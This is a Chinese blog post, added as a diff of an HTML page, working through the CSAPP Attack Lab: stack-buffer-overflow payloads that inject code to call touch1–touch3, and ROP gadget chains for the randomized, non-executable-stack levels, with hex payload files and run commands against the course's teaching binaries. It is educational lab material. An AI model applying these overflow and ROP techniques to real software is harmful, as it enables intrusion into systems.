@@ -1,0 +1,829 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.jpg">
+  <link rel="icon" href="/img/head.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="思源南路世一劈">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="CSAPP 之 Attack Lab 记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AttackLab">
+<meta property="og:url" content="http://example.com/2024/12/09/AttackLab/index.html">
+<meta property="og:site_name" content="Home">
+<meta property="og:description" content="CSAPP 之 Attack Lab 记录">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-12-09T08:37:05.000Z">
+<meta property="article:modified_time" content="2024-12-16T05:40:47.561Z">
+<meta property="article:author" content="思源南路世一劈">
+<meta property="article:tag" content="CSAPP">
+<meta property="article:tag" content="Assembly">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>AttackLab - Home</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"3e384ac8b80247a65b488b6040c23850","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?3e384ac8b80247a65b488b6040c23850";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>41P&#39;s Corner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/ayaka.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="AttackLab"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-12-09 16:37" pubdate>
+          2024年12月9日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          15 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">AttackLab</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="Attack-Lab"><a href="#Attack-Lab" class="headerlink" title="Attack Lab"></a>Attack Lab</h2><h3 id="获得汇编源码"><a href="#获得汇编源码" class="headerlink" title="获得汇编源码"></a>获得汇编源码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">objdump -d ./ctarget &gt; casm<br>objdump -d ./rtarget &gt; rasm<br></code></pre></td></tr></table></figure>
+
+<p>这个 lab 对汇编要求不多，主要是在对栈的理解上</p>
+<h3 id="分析漏洞"><a href="#分析漏洞" class="headerlink" title="分析漏洞"></a>分析漏洞</h3><p>lab 的文档里提到程序的漏洞位于 getbuf 函数，我们在汇编文件中找到它</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000401d47 &lt;getbuf&gt;:<br>  401d47:	f3 0f 1e fa          	endbr64<br>  401d4b:	48 83 ec 28          	sub    $0x28,%rsp<br>  401d4f:	48 89 e7             	mov    %rsp,%rdi<br>  401d52:	e8 91 02 00 00       	call   401fe8 &lt;Gets&gt;<br>  401d57:	b8 01 00 00 00       	mov    $0x1,%eax<br>  401d5c:	48 83 c4 28          	add    $0x28,%rsp<br>  401d60:	c3                   	ret<br></code></pre></td></tr></table></figure>
+
+<p>注意到分配了 0x28 的栈空间，即我需要先把这一部分写穿，再往上去覆盖 return address</p>
+<h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>这一部分的特点是栈是固定的，可以直接使用覆盖栈空间来解决问题</p>
+<h4 id="Part-1"><a href="#Part-1" class="headerlink" title="Part 1"></a>Part 1</h4><p>这一部分是个热身，在汇编里找到 touch1 的地址即可，注意要先用一堆字符把 40 的栈空间填满才能触碰到 RA</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000401d61 &lt;touch1&gt;:<br></code></pre></td></tr></table></figure>
+
+<p>地址即为 0x401d61，由于提供了 hex2raw 程序，实际上简化了我们的书写格式，只需要按照<strong>小端法</strong>书写即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>61 1d 40 00 00 00 00 00<br></code></pre></td></tr></table></figure>
+
+<p>调用程序时可能出现莫名的 segmentation fault，这是程序自己的问题，我们可以通过文件输入的方式来解决</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">./hex2raw &lt; 1-1.txt | ./ctarget<br><span class="hljs-comment">#or</span><br>./hex2raw &lt; 1-1.txt &gt; 1-1<br>./ctarget -i 1-1<br></code></pre></td></tr></table></figure>
+
+<p>当然也有学校的补丁可以用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">./hex2raw &lt; ./answer/1-1.txt | LD_PRELOAD=./printf.so ./ctarget<br><span class="hljs-comment">#使用gdb可用如下命令启动</span><br><span class="hljs-built_in">env</span> LD_PRELOAD=./printf.so gdb ./ctarget<br></code></pre></td></tr></table></figure>
+
+<h4 id="Part-2"><a href="#Part-2" class="headerlink" title="Part 2"></a>Part 2</h4><p>稍微难了一点，要求调用 touch2 的同时还要我把 cookie 作为参数传进去，这里我们便需要在 call touch2 的同时把参数传进去</p>
+<p>使用注入代码的思想，将调用函数的过程写成汇编代码，然后将汇编代码编译——反编译得到机器码，写在 getbuf 原本的栈空间里即可</p>
+<p>查看我所需要的信息：</p>
+<ul>
+<li>touch2 地址：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000401d95 &lt;touch2&gt;:<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>getbuf 分配栈帧后的栈顶指针位置（使用 GDB 获得）：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) p/x <span class="hljs-variable">$rsp</span><br><span class="hljs-variable">$2</span> = 0x556622b8<br></code></pre></td></tr></table></figure>
+
+<p>根据信息结合 cookie 的值（我的是 0x69afe3c6）来写出相应的汇编代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq $0x69afe3c6, %rdi<br>push $0x401d95<br>ret<br></code></pre></td></tr></table></figure>
+
+<p>为什么使用 ret 命令？在 CPU 中有一个“PC”即程序寄存器，在 x86-64 中用<code>%rip</code>表示，它时刻指向将要执行的下一条指令在内存中的地址。而<code>ret</code>指令就相当于：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop %rip<br>jmp %rip<br></code></pre></td></tr></table></figure>
+
+<p>即把栈中存放的地址弹出作为下一条指令的地址。</p>
+<p>于是使用 push 结合 ret 便能为所欲为</p>
+<p>经过编译——反编译后，即得到最终的答案，注意输入地址那里还是小端法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -c 1-2.s<br>objdump -d 1-2.o &gt; 1-2.d<br></code></pre></td></tr></table></figure>
+
+<p>将得到的结果放在文件里即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">48 c7 c7 c6 e3 af 69 68<br>95 1d 40 00 c3 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>b8 22 66 55 00 00 00 00  #之前的RA，用来跳转到注入的代码<br></code></pre></td></tr></table></figure>
+
+<p>最下面一行即为栈溢出后的 RA，我们的程序一开始就会跳转到这里，也即我们注入的代码的位置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./hex2raw &lt; ./answer/1-2.txt | LD_PRELOAD=./printf.so ./ctarget<br></code></pre></td></tr></table></figure>
+
+<h4 id="Part-3"><a href="#Part-3" class="headerlink" title="Part 3"></a>Part 3</h4><p>也需要传入 cookie 作为参数，但是不同的是这里的传参数方式变为传字符串首地址</p>
+<p>有什么不同呢？如果是直接传参，就可以写在注入代码里直接传，但是如果传的是首地址，就还需要另找空间存放这个 cookie</p>
+<p>由于这里加了个 hexmatch 来扰乱 getbuf 的栈帧，所以我们不能将字符串存放在这里，而是可以考虑放在 test 的栈帧里，这里不会被干扰</p>
+<p>所以我们效仿 part2，但是在 RA 上方写上 cookie，同时将 cookie 的地址作为参数在注入代码里传给%rdi</p>
+<p>按照上面的思路一步步来即可</p>
+<p>先获得需要的信息：</p>
+<ul>
+<li><p>touch3 地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000401e96 &lt;touch3&gt;:<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>cookie 存放位置，也即 test 的栈底：</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) p/x <span class="hljs-variable">$rsp</span><br><span class="hljs-variable">$2</span> = 0x556622e8<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>别忘了将 cookie 写成十六进制形式（想一想为什么这里又不用小端法了）：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">36 39 61 66 65 33 63 36<br></code></pre></td></tr></table></figure>
+
+<p>根据如上信息拟写汇编：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq $0x556622e8, %rdi<br>pushq $0x401e96<br>ret<br></code></pre></td></tr></table></figure>
+
+<p>汇编——反汇编——组合即得答案：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">48 c7 c7 e8 22 66 55 68  #注入的汇编代码<br>96 1e 40 00 c3 00 00 00<br>00 00 00 00 00 00 00 00  #补0以填满栈帧<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>b8 22 66 55 00 00 00 00  #之前的RA，用来跳转到注入代码<br>36 39 61 66 65 33 63 36  #COOKIE<br></code></pre></td></tr></table></figure>
+
+<p>一键运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./hex2raw &lt; ./answer/1-3.txt | LD_PRELOAD=./printf.so ./ctarget<br></code></pre></td></tr></table></figure>
+
+<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>这一部分限制了栈是不可执行的，且栈地址本身会随机化，所以引出了我们的第二种攻击方式——ROP</p>
+<p>即利用已有的代码进行拼凑和移花接木，得到我们想要的效果</p>
+<p>既然不能注入代码了，那我就单纯注入跳转代码的地址，而且这里的代码还是你自己的代码，完美规避了题目的障碍</p>
+<p>这里我们选取的代码通常需要以 c3 结尾，这样一条一条的 ret 便能将各部分代码连接起来，称之为 gadget</p>
+<p>打开汇编代码，里面 start_farm 到 end_farm 这一段即为可用的代码（注意文档里也说了只能使用这部分代码）</p>
+<p>只需要根据每个 phase 的需求去拼凑代码即可。注意可能一下子找不到直接的指令，这时候根据情况适当中转就行了</p>
+<h4 id="Part-4"><a href="#Part-4" class="headerlink" title="Part 4"></a>Part 4</h4><p>touch2 的升级版，但是要用 ROP</p>
+<p>很显然不可能找到含 cookie 立即数的 gadget，于是我们将 cookie 放在栈上，用 pop 指令去搞到%rdi 里即可</p>
+<p>探索后发现不能直接 pop %rdi，于是使用%rax 来中转</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#gadget 1<br>popq %rax<br>ret<br>#gadget 2<br>movq %rax, %rdi<br>ret<br></code></pre></td></tr></table></figure>
+
+<p>最后不要忘了在第二个 gadget 后写上 touch2 的地址哦！得到的答案文件如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00 00 00 00 00 00 00 00  #补0填栈<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>97 1f 40 00 00 00 00 00 #Gadget 1<br>c6 e3 af 69 00 00 00 00 #COOKIE<br>4b 1f 40 00 00 00 00 00 #Gadget 2<br>95 1d 40 00 00 00 00 00 #touch2的地址<br></code></pre></td></tr></table></figure>
+
+<p>运行爆破：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./hex2raw &lt; ./answer/2-2.txt | LD_PRELOAD=./printf.so ./ctarget<br></code></pre></td></tr></table></figure>
+
+<h4 id="Part-5"><a href="#Part-5" class="headerlink" title="Part 5"></a>Part 5</h4><p>即 touch3 的 ROP 版本，文档里说了这个题很难，但是做下来的观感来看难的不是思路，而是跳来跳去的 gadget</p>
+<p>一次找不到好的 gadget 那就只能用别的 gadget 来拼凑弥补了，遇到这种题也只能静心慢慢做了，况且每个人的都不一样，还真只能自己写</p>
+<p>关于思路：cookie 只能放在栈上，但是栈被随机化了，所以我们不能直接将地址传过去。但是相对地址是不会变的，我们只需要把 cookie 放在一个固定的位置，然后用%rsp 的加减某个数来表示这个地址即可！</p>
+<p>这里便直接给出拼凑好的代码供参考：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#Gadget 1<br>movq %rsp, %rax<br>ret<br><br>#Gadget 2<br>movq %rax, %rdi<br>ret<br><br>#Gadget 3<br>popq %rax<br>ret<br><br>#这里插入偏移量，根据总指令数计算<br>0x48<br><br>#Gadget 4<br>movl %eax, %edx<br>ret<br><br>#Gadget 5<br>movl %edx, %ecx<br>ret<br><br>#Gadget 6<br>movl %ecx, %esi<br>ret<br><br>#Gadget 7<br>lea    (%rdi,%rsi,1),%rax<br>ret<br><br>#Gadget 8<br>movq %rax, %rdi<br>ret<br><br>#这里放touch3的地址，和上一个ret连接起来<br>xxxxxxxx<br><br>#这里放cookie，在test的栈上，前面的操作即为准备这个地址<br>xxxxxxxx<br></code></pre></td></tr></table></figure>
+
+<p>得到的总代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>da 20 40 00 00 00 00 00<br>4b 1f 40 00 00 00 00 00<br>97 1f 40 00 00 00 00 00<br>48 00 00 00 00 00 00 00  #偏移量，注意从getbuf中ret的时候栈指针已经加8<br>c7 1f 40 00 00 00 00 00<br>31 20 40 00 00 00 00 00<br>8f 20 40 00 00 00 00 00<br>a7 1f 40 00 00 00 00 00<br>4b 1f 40 00 00 00 00 00<br>96 1e 40 00 00 00 00 00<br>36 39 61 66 65 33 63 36  #不放心可以后面再加点0<br></code></pre></td></tr></table></figure>
+
+<p>一键 attack：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./hex2raw &lt; ./answer/2-2.txt | LD_PRELOAD=./printf.so ./ctarget<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Courses/" class="category-chain-item">Courses</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Courses/ICS/" class="category-chain-item">ICS</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CSAPP/" class="print-no-link">#CSAPP</a>
+      
+        <a href="/tags/Assembly/" class="print-no-link">#Assembly</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>AttackLab</div>
+      <div>http://example.com/2024/12/09/AttackLab/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>思源南路世一劈</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年12月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/12/09/BombLab/" title="BombLab">
+                        <span class="hidden-mobile">BombLab</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Qiushao-E/Qiushao-E.github.io');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
